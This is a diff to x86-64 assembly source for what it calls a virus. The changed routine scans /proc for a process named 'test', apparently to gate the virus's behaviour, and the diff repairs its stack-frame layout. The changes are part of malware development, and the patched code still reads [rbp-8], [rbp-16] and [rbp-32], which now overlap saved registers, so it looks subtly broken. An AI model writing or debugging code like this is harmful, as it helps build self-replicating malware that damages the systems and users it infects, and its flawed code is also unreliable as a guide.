@@ -461,11 +461,11 @@ virus_search_signature:
 virus_check_process_running:
     push rbp
     mov rbp, rsp
-    sub rsp, 512                ; Stack space for buffers
     push r12                    ; proc fd
     push r13                    ; status fd
     push r14                    ; saved r15
     push rbx
+    sub rsp, 512                ; Stack space for buffers (AFTER pushes)
 
     mov r14, r15                ; Save r15 (virus base)
     xor rbx, rbx                ; process found flag = 0
@@ -487,7 +487,7 @@ virus_check_process_running:
     ; Read directory entries
     mov eax, SYS_GETDENTS64
     mov edi, r12d
-    lea rsi, [rbp-512]          ; Buffer on stack
+    lea rsi, [rsp]              ; Buffer at rsp (after stack allocation)
     mov edx, 512
     syscall
 
@@ -502,7 +502,7 @@ virus_check_process_running:
     cmp rax, [rbp-8]
     jge .vcheck_proc_read_loop
 
-    lea rdi, [rbp-512]
+    lea rdi, [rsp]
     add rdi, rax                ; dirent pointer
 
     ; Get d_reclen
@@ -520,24 +520,24 @@ virus_check_process_running:
     ja .vcheck_proc_next_entry
 
     ; Build path: /proc/[pid]/status
-    lea rdi, [rbp-256]          ; path buffer
+    lea rdi, [rsp+256]          ; path buffer
     lea rsi, [r14 + v_procdir - virus_start]
     call virus_str_copy         ; Copy "/proc/"
     
-    lea rdi, [rbp-256]
+    lea rdi, [rsp+256]
     call virus_str_len
-    lea rdi, [rbp-256]
+    lea rdi, [rsp+256]
     add rdi, rax
-    lea rsi, [rbp-512]
+    lea rsi, [rsp]
     mov rax, [rbp-16]
     add rsi, rax
     add rsi, 19                 ; d_name
     call virus_str_copy         ; Copy pid
     
     ; Append "/status"
-    lea rdi, [rbp-256]
+    lea rdi, [rsp+256]
     call virus_str_len
-    lea rdi, [rbp-256]
+    lea rdi, [rsp+256]
     add rdi, rax
     lea rsi, [r14 + v_proc_status - virus_start]
     call virus_str_copy
@@ -545,7 +545,7 @@ virus_check_process_running:
     ; Open status file
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
-    lea rsi, [rbp-256]
+    lea rsi, [rsp+256]
     xor edx, edx                ; O_RDONLY
     xor r10d, r10d
     syscall
@@ -558,7 +558,7 @@ virus_check_process_running:
     ; Read status file (first 128 bytes should be enough)
     mov eax, SYS_READ
     mov edi, r13d
-    lea rsi, [rbp-384]          ; status buffer
+    lea rsi, [rsp+128]          ; status buffer
     mov edx, 128
     syscall
 
@@ -573,7 +573,7 @@ virus_check_process_running:
     jle .vcheck_proc_next_entry
 
     ; Search for "Name:\ttest\n" in status buffer
-    lea rdi, [rbp-384]
+    lea rdi, [rsp+128]
     mov rsi, [rbp-32]           ; bytes read
     lea rdx, [r14 + v_proc_test_string - virus_start]
     mov rcx, v_proc_test_len
@@ -601,11 +601,11 @@ virus_check_process_running:
     mov rax, rbx                ; Return process found flag
     mov r15, r14                ; Restore r15
 
+    add rsp, 512
     pop rbx
     pop r14
     pop r13
     pop r12
-    add rsp, 512
     mov rsp, rbp
     pop rbp
     ret
